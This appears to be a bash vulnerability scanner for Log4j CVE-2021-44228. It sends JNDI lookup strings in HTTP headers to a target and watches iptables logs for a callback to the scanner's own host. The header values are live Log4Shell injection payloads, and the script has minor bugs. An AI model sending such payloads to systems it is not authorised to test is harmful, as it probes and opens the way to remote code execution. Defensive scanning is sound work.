#!/bin/bash
####
#### Scrtpt-203 | Version:2 | Courtecy, DEFCON250.org | etherPacket@gmail.com | On:10-Dec-2021 | To Identify the Log4j-CVE-2021-44228:

#### Variables

red=`tput setaf 1`
green=`tput setaf 2`
reset=`tput sgr0`
VAR001="${1:-127.0.0.1:80}"
IP=$(echo $VAR001 | awk -F':' '{print $1}')
PORT=$(echo $VAR001 | awk -F':' '{print $2}')
BADPORT="$2"
clear 
echo "" 
echo "${red}Usage:${reset} $0 <target-port>:<target-port> <scanner's-return-traffic-port>  [Ex: $0 192.168.1.100:443 1389]"
echo ""
echo ""
if [ -z "$1" ]; then exit; fi



#### Identify the default interface
DEFAULT_INTERFACE=$(ifconfig $(route -n | grep -i '^0.0.0.0' | awk '{print $NF}') | grep inet | awk '{print $2}')

#### If not exist, install iptables 
if ! which iptables 1> /dev/null; then apt-get install iptables; fi


#### Start the traffic recording on TCP/"$BADPORT" and append the logs to /var/log/messages
iptables -D INPUT -p tcp --dport "$BADPORT" --syn -j LOG --log-prefix "log4jScanner: " 2>/dev/null
iptables -A INPUT -p tcp --dport "$BADPORT" --syn -j LOG --log-prefix "log4jScanner: "
sleep 3

#### Record 'just-before-START-time' of the payload execution.
logger -i hello-world /var/log/messages
START_TIME=$(tail -n1 /var/log/messages | awk '{print $1,$2,$3}')

#### Run the test on target IP's HTTP 
timeout 2 curl -ksqL http://"$VAR001" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null
timeout 2 curl -ksqL http://"$VAR001" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null
timeout 2 curl -ksqL http://"$VAR001" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null
timeout 2 curl -ksqL http://"$VAR001" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null
timeout 2 curl -ksqL http://"$VAR001" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null

#### Run the test on target IP's HTTPS 
timeout 2 curl -ksqL https://"$VAR001" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null
timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null
timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null
timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null
timeout 2 curl -ksqL https://"$VAR001" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null


#### Record 'just-before-STOP-time' of the payload execution.
STOP_TIME=$(tail -n1 /var/log/messages | awk '{print $1,$2,$3}')

#### Stop the traffic recording on TCP/"$BADPORT"
iptables -D INPUT -p tcp --dport "$BADPORT" --syn -j LOG --log-prefix "log4jScanner: "

#### Validate if the IP/PORT are vulnerable to Log4j-CVE-2021-44228
rm -f ./"$IP".out; cat /var/log/messages | awk "/$START_TIME/,/$STOP_TIME/" | grep log4jScanner | grep -i "$IP" > /tmp/"$IP".out
echo ""
if [ -s /tmp/"$IP".out ]; then echo "$IP ${red}Is Vulnerable to CVE-2021-44228${reset}"; else echo "$IP ${green}Is Not Vulnerable to CVE-2021-44228${reset}";fi





